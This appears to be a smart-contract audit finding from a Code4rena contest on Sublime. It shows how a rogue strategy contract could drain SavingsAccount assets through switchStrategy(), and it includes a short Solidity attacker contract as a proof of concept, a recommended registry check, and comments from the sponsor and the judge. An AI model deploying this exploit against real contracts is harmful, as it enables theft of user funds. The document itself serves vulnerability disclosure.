@@ -1,0 +1,32 @@
+[H-08] Possibility to drain SavingsAccount contract assets
+Submitted by kemmio
+Impact
+A malicious actor can manipulate switchStrategy() function in a way to withdraw tokens that are locked in SavingsAccount contract
+(the risk severity should be reviewed)
+Proof of Concept
+Firstly an attacker need to deploy a rogue strategy contract implementing IYield.getSharesForTokens() and IYield.unlockTokens() functions
+and calling switchStrategy() with _currentStrategy = ROGUECONTRACTADDRESS (_newStrategy can be any valid strategy e.g. NoYield)
+https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L160
+require(_amount!=0,'SavingsAccount::switchStrategy Amount must be greater than zero');
+Bypass this check by setting _amount > 0, since it will be overwritten in linehttps://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L162
+_amount=IYield(_currentStrategy).getSharesForTokens(_amount,_token);
+getSharesForTokens() should be implemented to always return 0, hence to bypass the overflow in lineshttps://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L164-L167
+balanceInShares[msg.sender][_token][_currentStrategy] =balanceInShares[msg.sender][_token][_currentStrategy].sub(_amount,'SavingsAccount::switchStrategy Insufficient balance');
+since balanceInShares[msg.sender][_token][_currentStrategy] == 0 and 0-0 will not overflow
+The actual amount to be locked is saved in linehttps://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L169
+uint256_tokensReceived=IYield(_currentStrategy).unlockTokens(_token,_amount);
+the rouge unlockTokens() can check asset balance of the contract and return the full amount
+After that some adjustment are made to set approval for the token or to handle native assets casehttps://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L171-L177
+uint256_ethValue;if(_token!=address(0)) {IERC20(_token).safeApprove(_newStrategy,_tokensReceived);}else{_ethValue=_tokensReceived;}_amount=_tokensReceived;
+Finally the assets are locked in the locked strategy and shares are allocated on attackers acounthttps://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L179-L181
+uint256_sharesReceived=IYield(_newStrategy).lockTokens{value:_ethValue}(address(this),_token,_tokensReceived);balanceInShares[msg.sender][_token][_newStrategy] =balanceInShares[msg.sender][_token][_newStrategy].add(_sharesReceived);
+Proof of Concept
+import"@openzeppelin/contracts/token/ERC20/IERC20.sol";contractAttacker{functiongetSharesForTokens(uint256amount,addresstoken)externalpayablereturns(uint256){return0;}functionunlockTokens(addresstoken,uint256amount)externalpayablereturns(uint256){uint256bal;if(token==address(0))bal=msg.sender.balance;elsebal=IERC20(token).balanceOf(msg.sender);returnbal;}}
+Recommended Mitigation Steps
+Add a check for _currentStrategy to be from strategy list like the one in linehttps://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L159
+require(IStrategyRegistry(strategyRegistry).registry(_newStrategy), 'SavingsAccount::_newStrategy do not exist');
+ritik99 (Sublime) disputed:
+The savings account contract doesn’t hold any tokens, so it is not possible to lock tokens in a new strategy, hence this attack will not work. Nevertheless it is something we will explore further to limit unexpected state changes
+0xean (judge) commented:
+Based on the review of the warden I believe this is a valid attack path.  This line would need to change to the amount of tokens that are to be “stolen” but otherwise this does seem accurate.
+bal=IERC20(token).balanceOf(msg.sender);
